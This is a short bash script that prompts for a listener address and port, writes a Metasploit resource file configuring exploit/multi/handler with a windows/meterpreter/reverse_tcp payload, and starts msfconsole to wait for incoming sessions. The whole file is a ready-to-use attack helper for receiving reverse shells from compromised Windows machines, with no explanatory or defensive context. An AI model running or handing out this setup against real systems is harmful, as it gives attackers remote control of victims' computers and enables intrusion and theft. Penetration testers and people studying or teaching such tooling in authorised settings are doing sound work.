#!/bin/bash

echo "Enter LHOST:"
read LHOST
echo "Enter LPORT:"
read LPORT

echo "use exploit/multi/handler" > handler.rc
echo "set payload windows/meterpreter/reverse_tcp" >> handler.rc
echo "set LHOST $LHOST" >> handler.rc
echo "set LPORT $LPORT" >> handler.rc
echo "exploit -j" >> handler.rc

msfconsole -r handler.rc
